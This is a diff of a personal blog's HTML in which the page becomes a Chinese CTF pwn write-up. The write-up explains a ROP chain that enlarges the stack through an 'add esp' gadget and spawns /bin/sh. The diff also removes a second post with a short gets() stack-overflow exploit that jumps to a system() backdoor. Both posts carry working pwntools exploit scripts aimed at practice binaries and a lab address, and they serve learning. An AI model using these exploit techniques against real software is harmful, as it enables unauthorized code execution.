@@ -79,17 +79,21 @@
 
 
 
-<meta name="description" content="二进制小白进阶之路">
+<meta name="description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
 <meta name="keywords" content="时钟">
-<meta property="og:type" content="website">
-<meta property="og:title" content="时钟">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过esp扩大栈空间">
+<meta property="og:url" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/index.html">
 <meta property="og:site_name" content="时钟">
-<meta property="og:description" content="二进制小白进阶之路">
+<meta property="og:description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/2.jpg">
+<meta property="og:updated_time" content="2019-04-13T10:12:11.195Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="时钟">
-<meta name="twitter:description" content="二进制小白进阶之路">
+<meta name="twitter:title" content="通过esp扩大栈空间">
+<meta name="twitter:description" content="声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。博主QQ：522796871遇到一个修改esp扩大栈空间的题目跟大家分享一下：程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就IDA">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/13/通过esp扩大栈空间/1.jpg">
 
 
 
@@ -119,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/13/通过esp扩大栈空间/">
 
 
 
 
 
-  <title>时钟</title>
+  <title>通过esp扩大栈空间 | 时钟</title>
   
 
 
@@ -144,8 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -218,9 +221,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -250,9 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/13/通过esp扩大栈空间/" itemprop="url">通过esp扩大栈空间</a></h1>
+          <h1 class="post-title" itemprop="name headline">通过esp扩大栈空间</h1>
         
 
         <div class="post-meta">
@@ -302,15 +303,11 @@
       
 
       
-        
-          
-            <p>声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。<br>博主QQ：522796871<br>遇到一个修改esp扩大栈空间的题目跟大家分享一下：<br>程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：<br><img src="1.jpg" alt><br>看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就<br>IDA一键f5：<br><img src="2.jpg" alt><br>如果你进去verify函数，你就会发现它复杂的要死掉了，那我们就放弃静态分析，改用动态分析，输入大量字符测试得到有溢出，但是试着利用你就发现，根本利用不了（这也是这个题的特别之处），那我们ida动态调试得到，在verify函数中隐藏一个可以复制字符串的函数，明显为strcpy()（哎，大佬总是说明显，反正当时我看不出来），F8往下执行，发现有两个判断，输入的字符串前两位是否为py，（这个看出来应该不难吧）同时，原文中有：<br>通过观察数据我们很容易发现被修改的EIP是通过strncpy复制到输入前面的0x50个字节的最后8个（这个我之前从来没注意过，哎，是时候改抛弃无脑的GDB字符串测量了，因为你试了之后会发现，在这个题目里它没用）<br>OK,知道了上面的之后，我们可以开始构造rop了，下亮出代码（原文中的代码，我负责解释），一条条解释：<br>{<br>from pwn import <em><br>context.update(arch = ‘amd64’, os = ‘linux’, timeout = 1)<br>io = remote(‘172.17.0.3’, 10001)<br>payload = “”<br>payload += p64(0x6161616161617970)  #头两位为py，过检测<br>payload += ‘a’</em>0x40                 #padding<br>payload += p64(0x46f205)            #add esp, 0x58; ret<br>payload += ‘a’*8                    #padding<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_read设置参数<br>payload +=p64(0x8)                  #rdx = 8<br>payload += p64(0x6c7079)            #rsi = 0x6c7079<br>payload += p64(0x401823)            #pop rdi; ret 为sys_read设置参数<br>payload += p64(0x0)                 #rdi = 0<br>payload += p64(0x437ea9)            #mov rax, 0; syscall 调用sys_read<br>payload += p64(0x46f208)            #pop rax; ret<br>payload += p64(59)                  #rax = 0x3b<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_execve设置参数<br>payload += p64(0x0)                 #rdx = 0<br>payload += p64(0x0)                 #rsi = 0<br>payload += p64(0x401823)            #pop rdi; ret 为sys_execve设置参数<br>payload += p64(0x6c7079)            #rdi = 0x6c7079<br>payload += p64(0x437eae)            #syscall</p>
+        <p>声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。<br>博主QQ：522796871<br>遇到一个修改esp扩大栈空间的题目跟大家分享一下：<br>程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：<br><img src="1.jpg" alt><br>看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就<br>IDA一键f5：<br><img src="2.jpg" alt><br>如果你进去verify函数，你就会发现它复杂的要死掉了，那我们就放弃静态分析，改用动态分析，输入大量字符测试得到有溢出，但是试着利用你就发现，根本利用不了（这也是这个题的特别之处），那我们ida动态调试得到，在verify函数中隐藏一个可以复制字符串的函数，明显为strcpy()（哎，大佬总是说明显，反正当时我看不出来），F8往下执行，发现有两个判断，输入的字符串前两位是否为py，（这个看出来应该不难吧）同时，原文中有：<br>通过观察数据我们很容易发现被修改的EIP是通过strncpy复制到输入前面的0x50个字节的最后8个（这个我之前从来没注意过，哎，是时候改抛弃无脑的GDB字符串测量了，因为你试了之后会发现，在这个题目里它没用）<br>OK,知道了上面的之后，我们可以开始构造rop了，下亮出代码（原文中的代码，我负责解释），一条条解释：<br>{<br>from pwn import <em><br>context.update(arch = ‘amd64’, os = ‘linux’, timeout = 1)<br>io = remote(‘172.17.0.3’, 10001)<br>payload = “”<br>payload += p64(0x6161616161617970)  #头两位为py，过检测<br>payload += ‘a’</em>0x40                 #padding<br>payload += p64(0x46f205)            #add esp, 0x58; ret<br>payload += ‘a’*8                    #padding<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_read设置参数<br>payload +=p64(0x8)                  #rdx = 8<br>payload += p64(0x6c7079)            #rsi = 0x6c7079<br>payload += p64(0x401823)            #pop rdi; ret 为sys_read设置参数<br>payload += p64(0x0)                 #rdi = 0<br>payload += p64(0x437ea9)            #mov rax, 0; syscall 调用sys_read<br>payload += p64(0x46f208)            #pop rax; ret<br>payload += p64(59)                  #rax = 0x3b<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_execve设置参数<br>payload += p64(0x0)                 #rdx = 0<br>payload += p64(0x0)                 #rsi = 0<br>payload += p64(0x401823)            #pop rdi; ret 为sys_execve设置参数<br>payload += p64(0x6c7079)            #rdi = 0x6c7079<br>payload += p64(0x437eae)            #syscall</p>
 <p>print io.recv()<br>io.send(payload)<br>sleep(0.1)  #等待程序执行，防止出错</p>
 <p>io.send(‘/bin/sh\x00’)<br>io.interactive()</p>
 <p>}<br>注意，对esp的利用是的栈空间变为8位，对自己造的栈空间进行溢出攻击成功的运行了read函数，从而将sys_execve函数所需要使用的参数成功执行入寄存器，最终调用了sys_execve函数，不得不说，这是个十分精彩的rop链。<br>最后：我觉得这种exp的写法还是不用的好，逻辑关系看着困难<br>注：喜欢pwn的朋友可以加我QQ  一起讨论学习呀！</p>
 
-          
-        
       
     </div>
     
@@ -327,163 +324,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/06/linux-栈溢出-无保护/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="时钟">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="时钟">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/06/linux-栈溢出-无保护/" itemprop="url">linux-栈溢出-无保护</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-06T23:21:40+08:00">
-                2019-04-06
-              </time>
+              <a href="/2019/04/06/linux-栈溢出-无保护/" rel="next" title="linux-栈溢出-无保护">
+                <i class="fa fa-chevron-left"></i> linux-栈溢出-无保护
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWM/" itemprop="url" rel="index">
-                    <span itemprop="name">PWM</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <pre><code>首先我们先介绍一下栈溢出的基本原理：
-    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。
-
-PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn
-
-废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码）
-int __cdecl main(int argc, const char **argv, const char **envp)
-</code></pre><p>{<br>  char s; // [rsp+0h] [rbp-80h]</p>
-<p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p>
-<p>说明： 如果想要试试的话可以到我的github上下载题目 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shizhongpwn/pwnstudy.git</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -493,10 +355,11 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -504,6 +367,10 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 
           
+
+  
+
+
 
         </div>
         
@@ -718,6 +585,10 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
